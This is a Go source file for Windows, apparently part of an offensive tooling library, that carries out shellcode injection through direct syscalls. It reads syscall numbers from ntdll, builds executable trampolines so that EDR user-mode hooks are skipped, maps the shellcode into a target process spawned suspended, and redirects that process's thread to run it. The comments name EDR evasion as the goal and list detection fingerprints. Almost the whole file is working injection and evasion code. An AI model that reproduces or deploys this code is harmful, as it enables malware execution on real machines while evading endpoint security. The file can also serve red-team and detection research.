//go:build windows

package technique

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// DirectSyscallInject bypasses ntdll user-mode stubs entirely.
//
// Evasion over all previous techniques:
//   - EDR hooks live in ntdll's user-mode stubs (patching the first bytes of NtXxx functions).
//     This technique extracts the raw syscall number from the stub, builds its own 10-byte
//     trampoline, and issues the syscall instruction directly from our own memory.
//   - The hooked ntdll stub is never executed — EDR user-mode callbacks never fire.
//
// Trampoline layout (x64 Windows syscall ABI):
//   4C 8B D1        mov r10, rcx    ; Windows kernel expects 1st arg in r10
//   B8 xx xx 00 00  mov eax, <N>   ; syscall number (extracted from ntdll at runtime)
//   0F 05           syscall
//   C3              ret
//
// Detection fingerprint:
//   - Requires kernel-level ETW (not user-mode hook) to catch
//   - Sysmon Event 10: OpenProcess (kernel path, always logged regardless of user hooks)
//   - Sysmon Event 25: ProcessTampering — ETW KERNEL_THREATINT fires at kernel level
//   - syscall instruction not originating from ntdll.dll address range (suspicious origin check)
func DirectSyscallInject(target string, shellcode []byte) error {
	fmt.Printf("  [technique] Direct Syscall (bypass ntdll user-mode hooks)\n")
	fmt.Printf("  [target]    %s  payload %d bytes\n", target, len(shellcode))

	// Extract syscall numbers from ntdll stubs at runtime.
	// These are Windows-version-specific but stable within a build.
	numCreateSection, err := extractSyscallNumber("NtCreateSection")
	if err != nil {
		return fmt.Errorf("NtCreateSection syscall number: %w", err)
	}
	numMapView, err := extractSyscallNumber("NtMapViewOfSection")
	if err != nil {
		return fmt.Errorf("NtMapViewOfSection syscall number: %w", err)
	}
	fmt.Printf("  [syscall#]  NtCreateSection=0x%02x NtMapViewOfSection=0x%02x\n", numCreateSection, numMapView)

	// Build trampolines in local executable memory
	trampolineCreate, cleanup1, err := buildTrampoline(numCreateSection)
	if err != nil {
		return fmt.Errorf("trampoline (NtCreateSection): %w", err)
	}
	defer cleanup1()

	trampolineMap, cleanup2, err := buildTrampoline(numMapView)
	if err != nil {
		return fmt.Errorf("trampoline (NtMapViewOfSection): %w", err)
	}
	defer cleanup2()

	// Spawn target suspended
	pi, err := spawnProcess(target, true)
	if err != nil {
		return err
	}
	fmt.Printf("  [spawned]   PID %d TID %d (suspended)\n", pi.ProcessId, pi.ThreadId)

	defer func() {
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
	}()

	// NtCreateSection — called through our trampoline, not ntdll's stub
	var sectionHandle windows.Handle
	shellcodeSize := uintptr(len(shellcode))
	maxSize := int64(shellcodeSize)

	ntstatus, _, _ := syscall.SyscallN(
		trampolineCreate,
		uintptr(unsafe.Pointer(&sectionHandle)),
		SECTION_ALL_ACCESS,
		0,
		uintptr(unsafe.Pointer(&maxSize)),
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		0,
	)
	if ntstatus != 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("NtCreateSection (direct): 0x%x", ntstatus)
	}
	defer procNtClose.Call(uintptr(sectionHandle))
	fmt.Printf("  [section]   created via direct syscall (no ntdll hook path)\n")

	// NtMapViewOfSection (local) — through trampoline
	var localAddr uintptr
	viewSize := shellcodeSize

	ntstatus, _, _ = syscall.SyscallN(
		trampolineMap,
		uintptr(sectionHandle),
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&localAddr)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSize)),
		VIEW_SHARE, 0,
		PAGE_EXECUTE_READWRITE,
	)
	if ntstatus != 0 {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("NtMapViewOfSection local (direct): 0x%x", ntstatus)
	}

	dst := (*[1 << 30]byte)(unsafe.Pointer(localAddr))[:shellcodeSize:shellcodeSize]
	copy(dst, shellcode)

	// NtMapViewOfSection (remote) — through trampoline
	var remoteAddr uintptr
	viewSize = shellcodeSize

	ntstatus, _, _ = syscall.SyscallN(
		trampolineMap,
		uintptr(sectionHandle),
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&remoteAddr)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSize)),
		VIEW_SHARE, 0,
		PAGE_EXECUTE_READ,
	)
	if ntstatus != 0 {
		procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localAddr)
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("NtMapViewOfSection remote (direct): 0x%x", ntstatus)
	}
	procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localAddr)
	fmt.Printf("  [remote map] 0x%x via direct syscall — ntdll hooks bypassed\n", remoteAddr)

	ac, err := getThreadContext(pi.Thread)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}
	ac.ctx.SetRip(uint64(remoteAddr))
	if err := setThreadContext(pi.Thread, ac); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}

	if _, err := windows.ResumeThread(pi.Thread); err != nil {
		return fmt.Errorf("ResumeThread: %w", err)
	}
	fmt.Printf("  [resumed]   PID %d\n", pi.ProcessId)
	return nil
}

// extractSyscallNumber reads the syscall number from an ntdll stub.
// On unhooked Windows 10/11 x64, the stub starts with:
//   4C 8B D1        mov r10, rcx
//   B8 xx xx 00 00  mov eax, <syscall_number>
// We scan for the B8 byte and extract the following uint16.
func extractSyscallNumber(funcName string) (uint16, error) {
	proc := ntdll.NewProc(funcName)
	if err := proc.Find(); err != nil {
		return 0, err
	}
	addr := proc.Addr()

	// Scan up to 32 bytes for 'mov eax, N' (B8 lo hi 00 00).
	// Only require stub[i+3]==0x00 — syscall numbers fit in uint16, upper two bytes are 0.
	// Requiring stub[i+2]==0x00 incorrectly rejects numbers ≥ 256 (e.g. 0x0100).
	stub := (*[32]byte)(unsafe.Pointer(addr))
	for i := 0; i < 24; i++ {
		if stub[i] == 0xB8 && stub[i+3] == 0x00 {
			return uint16(stub[i+1]) | uint16(stub[i+2])<<8, nil
		}
	}
	return 0, fmt.Errorf("B8 pattern not found in %s stub (ntdll may be hooked)", funcName)
}

// buildTrampoline allocates executable memory and writes:
//   mov r10, rcx   (4C 8B D1)
//   mov eax, N     (B8 xx xx 00 00)
//   syscall        (0F 05)
//   ret            (C3)
// Returns the address of the trampoline and a cleanup function.
func buildTrampoline(syscallNum uint16) (uintptr, func(), error) {
	stub := []byte{
		0x4C, 0x8B, 0xD1,                              // mov r10, rcx
		0xB8, byte(syscallNum), byte(syscallNum >> 8), 0x00, 0x00, // mov eax, N
		0x0F, 0x05, // syscall
		0xC3,       // ret
	}

	mem, err := windows.VirtualAlloc(0, uintptr(len(stub)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		return 0, nil, fmt.Errorf("VirtualAlloc (trampoline): %w", err)
	}

	dst := (*[11]byte)(unsafe.Pointer(mem))
	copy(dst[:], stub)

	cleanup := func() {
		windows.VirtualFree(mem, 0, windows.MEM_RELEASE)
	}
	return mem, cleanup, nil
}
